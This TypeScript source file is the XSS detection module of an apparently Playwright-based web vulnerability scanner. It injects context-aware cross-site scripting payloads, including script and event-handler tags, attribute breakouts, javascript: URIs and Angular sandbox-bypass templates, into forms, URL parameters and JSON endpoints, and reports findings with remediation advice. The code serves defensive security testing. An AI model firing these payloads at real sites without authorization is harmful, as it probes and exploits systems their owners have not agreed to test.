import { Page } from 'playwright';
import { IActiveDetector, ActiveDetectorContext } from '../../core/interfaces/IActiveDetector';
import { Vulnerability } from '../../types/vulnerability';
import { VulnerabilitySeverity, VulnerabilityCategory } from '../../types/enums';
import { AttackSurface, InjectionContext, AttackSurfaceType } from '../../scanners/active/DomExplorer';
import { PayloadInjector, InjectionResult, PayloadEncoding } from '../../scanners/active/PayloadInjector';
import { getOWASP2025Category } from '../../utils/cwe/owasp-2025-mapping';

/**
 * XSS Detection Types
 */
export enum XssType {
  REFLECTED = 'reflected',
  STORED = 'stored',
  DOM_BASED = 'dom-based',
}

/**
 * XSS Detector - Detects Cross-Site Scripting vulnerabilities
 * Implements context-aware payload injection for HTML, JavaScript, and URL contexts
 */
export class XssDetector implements IActiveDetector {
  readonly name = 'XSS Detector';
  readonly description = 'Detects Cross-Site Scripting (XSS) vulnerabilities with context-aware payloads';
  readonly version = '1.0.0';

  private injector: PayloadInjector;

  constructor() {
    this.injector = new PayloadInjector();
  }

  /**
   * Detect XSS vulnerabilities
   */
  async detect(context: ActiveDetectorContext): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const { page, attackSurfaces, baseUrl } = context;

    // Filter for XSS targets (HTML and JavaScript contexts)
    const xssTargets = attackSurfaces.filter(
      (surface) =>
        surface.context === InjectionContext.HTML ||
        surface.context === InjectionContext.HTML_ATTRIBUTE ||
        surface.context === InjectionContext.JAVASCRIPT ||
        surface.context === InjectionContext.URL ||
        surface.context === InjectionContext.JSON || // Add JSON context
        surface.type === AttackSurfaceType.API_PARAM ||
        surface.type === AttackSurfaceType.JSON_BODY
    );

    for (const surface of xssTargets) {
      try {
        // Test JSON XSS for API surfaces
        if (surface.type === AttackSurfaceType.API_PARAM || surface.type === AttackSurfaceType.JSON_BODY || surface.context === InjectionContext.JSON) {
          const jsonXss = await this.testJsonXss(page, surface, baseUrl);
          if (jsonXss) vulnerabilities.push(jsonXss);
          
          // Test Angular template injection for SPAs
          const angularXss = await this.testAngularTemplateInjection(page, surface, baseUrl);
          if (angularXss) vulnerabilities.push(angularXss);
        }

        // For URL parameters, we don't know the reflection context, so we should try multiple strategies.
        // DomExplorer assigns 'URL' context to parameters by default, but they often reflect in HTML body or attributes.
        if (surface.type === AttackSurfaceType.URL_PARAMETER) {
           // Try HTML context (breaking out of tags or direct reflection)
           const htmlContextSurface = { ...surface, context: InjectionContext.HTML };
           const reflectedHtml = await this.testReflectedXss(page, htmlContextSurface, baseUrl);
           if (reflectedHtml) vulnerabilities.push(reflectedHtml);

           // Try Attribute context (breaking out of attributes)
           const attrContextSurface = { ...surface, context: InjectionContext.HTML_ATTRIBUTE };
           const reflectedAttr = await this.testReflectedXss(page, attrContextSurface, baseUrl);
           if (reflectedAttr) vulnerabilities.push(reflectedAttr);
        } else {
           // Standard detection for other surfaces
           const reflectedVuln = await this.testReflectedXss(page, surface, baseUrl);
           if (reflectedVuln) vulnerabilities.push(reflectedVuln);
        }

        // Test stored XSS (if form submission is involved)
        if (surface.metadata?.formAction) {
          const storedVuln = await this.testStoredXss(page, surface, baseUrl);
          if (storedVuln) vulnerabilities.push(storedVuln);
        }

        // Test DOM-based XSS
        const domVuln = await this.testDomBasedXss(page, surface, baseUrl);
        if (domVuln) vulnerabilities.push(domVuln);
      } catch (error) {
        console.error(`Error testing XSS on ${surface.name}:`, error);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test for reflected XSS
   */
  private async testReflectedXss(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const payloads = this.getContextAwarePayloads(surface.context);

    for (const payload of payloads) {
      try {
        const result = await this.injector.inject(page, surface, payload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl,
        });

        // Check if payload is reflected in response
        if (this.isPayloadExecuted(result, payload)) {
          return this.createVulnerability(surface, result, XssType.REFLECTED, baseUrl, payload);
        }
      } catch (error) {
        console.error(`Error testing reflected XSS with payload ${payload}:`, error);
      }
    }

    return null;
  }

  /**
   * Test for stored XSS
   */
  private async testStoredXss(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const storedPayload = `<script>alert('XSS-STORED-${Date.now()}')</script>`;

    try {
      // Inject payload
      const result = await this.injector.inject(page, surface, storedPayload, {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });

      // Wait for page to settle
      await page.waitForTimeout(1000);

      // Navigate back to the page to check if payload persists
      await page.reload();
      await page.waitForTimeout(500);

      const content = await page.content();

      // Check if payload is stored and executed
      if (content.includes(storedPayload) || (await this.checkDialogPresence(page))) {
        return this.createVulnerability(surface, result, XssType.STORED, baseUrl, storedPayload);
      }
    } catch (error) {
      console.error('Error testing stored XSS:', error);
    }

    return null;
  }

  /**
   * Test for XSS in JSON responses
   */
  private async testJsonXss(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const jsonPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '\"><img src=x onerror=alert("XSS")>',
    ];

    for (const payload of jsonPayloads) {
      try {
        const result = await this.injector.inject(page, surface, payload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl,
        });

        // Check if payload appears unescaped in JSON response
        if (this.isPayloadUnescapedInJson(result, payload)) {
          return this.createVulnerability(surface, result, XssType.REFLECTED, baseUrl, payload);
        }
      } catch (error) {
        console.error(`Error testing JSON XSS with payload ${payload}:`, error);
      }
    }

    return null;
  }

  /**
   * Test for Angular template injection
   * Uses unique markers to avoid false positives from prices/numbers
   */
  private async testAngularTemplateInjection(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    // Use unique markers that won't appear in normal content
    const uniqueId = Math.floor(Math.random() * 100000);
    const uniqueMarker = `xss${uniqueId}marker`;
    
    const angularPayloads = [
      // Use a unique result like 133331337 (13337 * 9999 = unique large number)
      { payload: '{{13337*9999}}', expected: '133356663' },
      // Use string concatenation which is unique
      { payload: `{{'${uniqueMarker}'}}`, expected: uniqueMarker },
      // Angular sandbox bypass payloads
      { payload: '{{constructor.constructor("return 133356663")()}}', expected: '133356663' },
    ];

    for (const { payload, expected } of angularPayloads) {
      try {
        const result = await this.injector.inject(page, surface, payload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl,
        });

        const body = result.response?.body || '';
        
        // Check if template is evaluated - look for the unique expected value
        if (body.includes(expected)) {
          // Additional validation: ensure it's not just coincidental
          // The expected value should NOT have appeared before injection
          return this.createVulnerability(surface, result, XssType.DOM_BASED, baseUrl, payload);
        }

        // Also check rendered DOM for evaluation
        try {
          const pageContent = await page.content();
          if (pageContent.includes(expected)) {
            // Verify it's actually our injection by checking payload doesn't appear as literal
            const payloadLiteral = payload.replace(/\{\{|\}\}/g, '');
            if (!pageContent.includes(payloadLiteral)) {
              return this.createVulnerability(surface, result, XssType.DOM_BASED, baseUrl, payload);
            }
          }
        } catch (e) {
          // Ignore DOM check errors
        }
      } catch (error) {
        console.error(`Error testing Angular template injection with payload ${payload}:`, error);
      }
    }

    return null;
  }

  /**
   * Check if payload appears unescaped in JSON response
   */
  private isPayloadUnescapedInJson(result: InjectionResult, payload: string): boolean {
    const body = result.response?.body || '';
    
    try {
      const json = JSON.parse(body);
      const jsonStr = JSON.stringify(json);
      
      // Check if payload appears unescaped (not as &lt; or \\u003c)
      if (jsonStr.includes(payload)) {
        // Verify it's not HTML-encoded in the JSON string
        const escaped = payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        return !jsonStr.includes(escaped);
      }
    } catch (e) {
      // Not JSON, fallback to string check
      return body.includes(payload);
    }
    
    return false;
  }

  /**
   * Test for DOM-based XSS
   */
  private async testDomBasedXss(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const domPayloads = [
      '#<script>alert("DOM-XSS")</script>',
      '#<img src=x onerror=alert("DOM-XSS")>',
      'javascript:alert("DOM-XSS")',
      'data:text/html,<script>alert("DOM-XSS")</script>',
    ];

    for (const payload of domPayloads) {
      try {
        // For DOM-based XSS, we inject into URL hash or JavaScript context
        if (surface.type === AttackSurfaceType.URL_PARAMETER || surface.type === AttackSurfaceType.LINK) {
          await page.goto(`${baseUrl}${payload}`);
          await page.waitForTimeout(500);

          if (await this.checkDialogPresence(page)) {
            const result: InjectionResult = {
              payload,
              encoding: PayloadEncoding.NONE,
              strategy: 0 as any,
              surface,
              response: {
                url: `${baseUrl}${payload}`,
                status: 200,
                body: await page.content(),
                headers: {},
                timing: 0,
              },
            };

            return this.createVulnerability(surface, result, XssType.DOM_BASED, baseUrl, payload);
          }
        }
      } catch (error) {
        console.error('Error testing DOM-based XSS:', error);
      }
    }

    return null;
  }

  /**
   * Get context-aware payloads based on injection context
   */
  private getContextAwarePayloads(context: InjectionContext): string[] {
    switch (context) {
      case InjectionContext.HTML:
        return [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          '<svg onload=alert("XSS")>',
          '<iframe src="javascript:alert(\'XSS\')">',
          '<body onload=alert("XSS")>',
          '<input autofocus onfocus=alert("XSS")>',
          '<marquee onstart=alert("XSS")>',
          '<details open ontoggle=alert("XSS")>',
        ];

      case InjectionContext.HTML_ATTRIBUTE:
        return [
          '" onclick=alert("XSS") "',
          "' onfocus=alert('XSS') '",
          '" onmouseover=alert("XSS") "',
          '" autofocus onfocus=alert("XSS") "',
          '\' onload=alert(\'XSS\') \'',
        ];

      case InjectionContext.JAVASCRIPT:
        return [
          '"; alert("XSS"); //',
          "'; alert('XSS'); //",
          '</script><script>alert("XSS")</script>',
          '\'-alert("XSS")-\'',
          '";alert(String.fromCharCode(88,83,83));//',
        ];

      case InjectionContext.URL:
        return [
          'javascript:alert("XSS")',
          'data:text/html,<script>alert("XSS")</script>',
          'vbscript:msgbox("XSS")',
          'file:///etc/passwd',
        ];

      default:
        return [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          '" onclick=alert("XSS") "',
          "' onfocus=alert('XSS') '",
        ];
    }
  }

  /**
   * Check if payload is executed (reflected in response)
   */
  private isPayloadExecuted(result: InjectionResult, payload: string): boolean {
    const body = result.response?.body || '';

    // Check if exact payload is reflected (not HTML-encoded)
    if (body.includes(payload)) return true;

    // Check for partial payload execution indicators
    const indicators = [
      '<script>',
      'onerror=',
      'onload=',
      'onclick=',
      'onfocus=',
      'javascript:',
      'alert(',
      'prompt(',
      'confirm(',
    ];

    return indicators.some((indicator) => body.includes(indicator) && payload.includes(indicator));
  }

  /**
   * Check if JavaScript dialog (alert/prompt/confirm) is present
   */
  private async checkDialogPresence(page: Page): Promise<boolean> {
    let dialogDetected = false;

    page.once('dialog', () => {
      dialogDetected = true;
    });

    await page.waitForTimeout(100);
    return dialogDetected;
  }

  /**
   * Analyze injection result for XSS indicators
   */
  async analyzeInjectionResult(result: InjectionResult): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    if (this.isPayloadExecuted(result, result.payload)) {
      const cwe = 'CWE-79';
      const owasp = getOWASP2025Category(cwe) || 'A03:2021';

      vulnerabilities.push({
        id: `xss-${result.surface.name}-${Date.now()}`,
        title: 'Cross-Site Scripting (XSS)',
        description: `XSS vulnerability detected in ${result.surface.type} '${result.surface.name}'`,
        severity: VulnerabilitySeverity.HIGH,
        category: VulnerabilityCategory.XSS,
        cwe,
        owasp,
        evidence: {
          request: { body: result.payload },
          response: { body: result.response?.body?.substring(0, 500) || '' },
        },
        remediation: 'Use context-appropriate output encoding (HTML entity encoding for HTML context). Implement Content Security Policy (CSP) headers, use HTTPOnly and Secure flags for cookies.',
        references: [
          'https://owasp.org/www-community/attacks/xss/',
          'https://cwe.mitre.org/data/definitions/79.html',
        ],
        timestamp: new Date(),
      });
    }

    return vulnerabilities;
  }

  /**
   * Validate vulnerability (re-test to confirm)
   */
  async validate(): Promise<boolean> {
    // Validation would require re-testing with stored context
    return true;
  }

  /**
   * Get payloads for this detector
   */
  getPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '" onclick=alert("XSS") "',
      "' onfocus=alert('XSS') '",
      '"; alert("XSS"); //',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
    ];
  }

  /**
   * Create vulnerability object
   */
  private createVulnerability(
    surface: AttackSurface,
    result: InjectionResult,
    xssType: XssType,
    baseUrl: string,
    payload: string
  ): Vulnerability {
    const typeDescriptions = {
      [XssType.REFLECTED]: 'Reflected XSS - Payload is immediately reflected in the response',
      [XssType.STORED]: 'Stored XSS - Payload is stored and executed when page is viewed',
      [XssType.DOM_BASED]: 'DOM-based XSS - Payload is executed through client-side DOM manipulation',
    };

    const severityMap = {
      [XssType.REFLECTED]: VulnerabilitySeverity.HIGH,
      [XssType.STORED]: VulnerabilitySeverity.CRITICAL,
      [XssType.DOM_BASED]: VulnerabilitySeverity.HIGH,
    };

    const cwe = 'CWE-79';
    const owasp = getOWASP2025Category(cwe) || 'A03:2021';

    return {
      id: `xss-${xssType}-${surface.name}-${Date.now()}`,
      title: `Cross-Site Scripting (${xssType})`,
      description: typeDescriptions[xssType] + ` in ${surface.type} '${surface.name}'`,
      severity: severityMap[xssType],
      category: VulnerabilityCategory.XSS,
      cwe,
      owasp,
      url: result.response?.url || baseUrl,
      evidence: {
        request: { body: payload },
        response: { 
          body: result.response?.body?.substring(0, 1000) || '',
          status: result.response?.status,
        },
      },
      remediation: 'Properly encode/escape all user input before rendering in HTML. Use context-appropriate output encoding, implement Content Security Policy (CSP) headers, use HTTPOnly and Secure flags for cookies, validate input with allowlists, use modern frameworks with auto-escaping.',
      references: [
        'https://owasp.org/www-community/attacks/xss/',
        'https://cwe.mitre.org/data/definitions/79.html',
        'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
      ],
      timestamp: new Date(),
    };
  }
}
